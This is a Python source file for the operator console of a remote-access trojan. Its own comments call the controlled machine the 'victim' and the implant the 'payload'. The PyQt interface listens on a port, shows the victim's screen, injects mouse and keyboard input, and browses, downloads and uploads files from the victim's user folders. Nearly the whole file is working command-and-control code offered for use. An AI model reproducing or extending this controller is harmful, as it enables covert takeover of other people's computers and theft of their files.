# language: Python, file: rdp_operator.py
# *GUI: Ctrl+Insert — окно поверх; клик по картинке = клик на жертве*
import socket, struct, json, base64, sys, threading, os
from PyQt5 import QtWidgets, QtGui, QtCore
from PyQt5.QtCore import Qt
import keyboard

SERVER_PORT = 5555

class Operator(QtWidgets.QWidget):
    def __init__(self):
        super().__init__()
        self.setWindowTitle("Operator")
        self.resize(1200, 700)
        self.screen_label = QtWidgets.QLabel(alignment=Qt.AlignCenter)
        self.screen_label.setMinimumSize(900, 600)
        self.screen_label.setStyleSheet("background:#111;color:#ccc")
        self.screen_label.setText("waiting for payload...")
        self.screen_label.setMouseTracking(True)
        self.screen_label.setFocusPolicy(Qt.StrongFocus)
        self.screen_label.mousePressEvent = self.mouse_press
        self.screen_label.mouseMoveEvent = self.mouse_move
        self.screen_label.mouseDoubleClickEvent = self.mouse_dclick

        self.file_list = QtWidgets.QListWidget()
        self.path_edit = QtWidgets.QLineEdit("C:\\Users")
        btn_up = QtWidgets.QPushButton("Up")
        btn_dl = QtWidgets.QPushButton("Download")
        btn_ul = QtWidgets.QPushButton("Upload")
        btn_up.clicked.connect(lambda: self.send({"t": "list", "path": self.parent_path(self.path_edit.text())}))
        btn_dl.clicked.connect(self.download)
        btn_ul.clicked.connect(self.upload)
        self.file_list.itemDoubleClicked.connect(self.open_item)

        right = QtWidgets.QVBoxLayout()
        right.addWidget(self.path_edit)
        row = QtWidgets.QHBoxLayout(); row.addWidget(btn_up); row.addWidget(btn_dl); row.addWidget(btn_ul)
        right.addLayout(row); right.addWidget(self.file_list)

        lay = QtWidgets.QHBoxLayout(self)
        lay.addWidget(self.screen_label, 3)
        lay.addLayout(right, 1)

        self.sock = None
        self.lock = threading.Lock()
        self.img_size = None
        self.pix_rect = None
        keyboard.add_hotkey("ctrl+insert", self.bring_front)
        threading.Thread(target=self.accept_loop, daemon=True).start()

    def bring_front(self):
        QtCore.QMetaObject.invokeMethod(self, "raise_front",
                                       Qt.QueuedConnection)

    @QtCore.pyqtSlot()
    def raise_front(self):
        self.showNormal(); self.raise_(); self.activateWindow()

    def accept_loop(self):
        srv = socket.socket()
        srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        srv.bind(("0.0.0.0", SERVER_PORT))
        srv.listen(1)
        while True:
            try:
                self.sock, addr = srv.accept()
                magic = self.sock.recv(4)
                if magic != b"RDP1":
                    self.sock.close(); self.sock = None; continue
                self.sock.settimeout(60)
                self.send({"t": "list", "path": self.path_edit.text()})
                threading.Thread(target=self.recv_loop, daemon=True).start()
            except Exception:
                time.sleep(1)

    def recv_loop(self):
        while True:
            try:
                msg = self.recv_msg()
                if not msg:
                    break
                if msg["t"] == "screen":
                    self.img_size = (msg["w"], msg["h"])
                    pm = QtGui.QPixmap()
                    pm.loadFromData(base64.b64decode(msg["d"]), "JPEG")
                    scaled = pm.scaled(self.screen_label.size(),
                                       Qt.KeepAspectRatio, Qt.SmoothTransformation)
                    self.screen_label.setPixmap(scaled)
                    x = (self.screen_label.width() - scaled.width()) // 2
                    y = (self.screen_label.height() - scaled.height()) // 2
                    self.pix_rect = (x, y, scaled.width(), scaled.height())
                elif msg["t"] == "list":
                    self.path_edit.setText(msg["path"])
                    self.file_list.clear()
                    for it in msg["items"]:
                        item = QtWidgets.QListWidgetItem(
                            ("📁 " if it["dir"] else "📄 ") + it["name"])
                        item.setData(Qt.UserRole, it)
                        self.file_list.addItem(item)
                elif msg["t"] == "file":
                    path, _ = QtWidgets.QFileDialog.getSaveFileName(
                        self, "Save", os.path.basename(msg["path"]))
                    if path:
                        open(path, "wb").write(base64.b64decode(msg["d"]))
                elif msg["t"] == "err":
                    QtWidgets.QMessageBox.warning(self, "err", msg["msg"])
            except Exception:
                break

    def to_remote(self, pos):
        if not self.img_size or not self.pix_rect:
            return None
        ox, oy, pw, ph = self.pix_rect
        rx, ry = pos.x() - ox, pos.y() - oy
        if rx < 0 or ry < 0 or rx >= pw or ry >= ph:
            return None
        w, h = self.img_size
        return int(rx * w / pw), int(ry * h / ph)

    def mouse_press(self, e):
        xy = self.to_remote(e.pos())
        if not xy: return
        btn = "right" if e.button() == Qt.RightButton else "left"
        self.send({"t": "mouse", "x": xy[0], "y": xy[1], "click": True, "button": btn})

    def mouse_dclick(self, e):
        xy = self.to_remote(e.pos())
        if not xy: return
        self.send({"t": "mouse", "x": xy[0], "y": xy[1], "click": True,
                   "button": "left", "clicks": 2})

    def mouse_move(self, e):
        if e.buttons() & Qt.LeftButton:
            xy = self.to_remote(e.pos())
            if xy:
                self.send({"t": "mouse", "x": xy[0], "y": xy[1], "click": False})

    def keyPressEvent(self, e):
        if not self.sock: return
        k = e.text()
        if k and k.isprintable():
            self.send({"t": "type", "text": k})
        else:
            key = self.qt_key(e.key())
            if key:
                self.send({"t": "key", "key": key, "down": True})
                self.send({"t": "key", "key": key, "down": False})

    def qt_key(self, key):
        m = {Qt.Key_Return: "enter", Qt.Key_Backspace: "backspace",
             Qt.Key_Escape: "esc", Qt.Key_Tab: "tab", Qt.Key_Space: "space",
             Qt.Key_Up: "up", Qt.Key_Down: "down", Qt.Key_Left: "left",
             Qt.Key_Right: "right", Qt.Key_Home: "home", Qt.Key_End: "end",
             Qt.Key_PageUp: "pageup", Qt.Key_PageDown: "pagedown",
             Qt.Key_Delete: "delete", Qt.Key_F1: "f1", Qt.Key_F2: "f2",
             Qt.Key_F3: "f3", Qt.Key_F4: "f4", Qt.Key_F5: "f5",
             Qt.Key_F6: "f6", Qt.Key_F7: "f7", Qt.Key_F8: "f8",
             Qt.Key_F9: "f9", Qt.Key_F10: "f10", Qt.Key_F11: "f11",
             Qt.Key_F12: "f12"}
        return m.get(key)

    def open_item(self, item):
        data = item.data(Qt.UserRole)
        if not data or not data["dir"]:
            return
        path = self.path_edit.text().rstrip("\\/") + "/" + data["name"]
        self.send({"t": "list", "path": path})

    def parent_path(self, p):
        return p.rstrip("/\\").rsplit("/", 1)[0] or "C:\\"

    def download(self):
        it = self.file_list.currentItem()
        if not it: return
        data = it.data(Qt.UserRole)
        path = self.path_edit.text().rstrip("\\/") + "/" + data["name"]
        self.send({"t": "get", "path": path})

    def upload(self):
        path, _ = QtWidgets.QFileDialog.getOpenFileName(self, "Upload")
        if not path: return
        data = base64.b64encode(open(path, "rb").read()).decode()
        self.send({"t": "put",
                   "path": self.path_edit.text().rstrip("\\/") + "/" + os.path.basename(path),
                   "d": data})

    def send(self, obj):
        if not self.sock: return
        data = json.dumps(obj).encode()
        with self.lock:
            try:
                self.sock.sendall(struct.pack("!I", len(data)) + data)
            except Exception:
                self.sock = None

    def recv_msg(self):
        hdr = self.sock.recv(4)
        if not hdr: return None
        n = struct.unpack("!I", hdr)[0]
        if n > 50_000_000: return None
        buf = b""
        while len(buf) < n:
            c = self.sock.recv(n - len(buf))
            if not c: return None
            buf += c
        return json.loads(buf)

if __name__ == "__main__":
    app = QtWidgets.QApplication(sys.argv)
    w = Operator()
    w.show()
    sys.exit(app.exec_())
